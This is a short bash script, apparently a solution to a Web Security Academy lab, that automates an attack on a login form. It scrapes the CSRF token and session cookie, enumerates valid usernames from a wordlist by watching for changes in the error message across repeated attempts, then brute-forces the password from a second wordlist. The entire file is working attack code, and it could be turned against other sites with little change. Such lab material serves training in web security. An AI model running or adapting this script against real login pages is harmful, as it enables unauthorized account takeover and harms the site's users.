#!/bin/bash

URL='https://ac681ff01fdae0fd800c26bb00a700dc.web-security-academy.net/login'
NULL='/dev/null'

REQUEST1=`curl $URL -D- -s`
CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`
VALID=0
for USER in `cat user.txt`
do
    echo "Probando para USER=$USER"
    for i in `seq 1 4`
    do
	    DATA='csrf='$CSRF'&username='$USER'&password=a'
	    RESULT=`curl $URL -d $DATA -b $COOKIE -s`

	    if echo $RESULT | grep -oP "Invalid username or password." > $NULL
	    then
		    echo -ne ""
	    else
		    echo "Valid user: $USER"
		    VALID=1
		    break
	    fi
    done
    if [ $VALID == 1 ]
    then
        break
    fi
done

for PASS in `cat password.txt`;do

    DATA='csrf='$CSRF'&username='$USER'&password='$PASS
    RESULT=`curl $URL -d $DATA -b $COOKIE -s`

    if echo $RESULT | grep -o "Invalid username or password." > $NULL
    then
        echo "Incorrect creds: $USER:$PASS"
    else
        if echo $RESULT | grep -o "Please try" > $NULL
        then
            echo "Incorrect creds: $USER:$PASS"
        else
            echo "Valid creds: $USER:$PASS"
            break
        fi
    fi
done
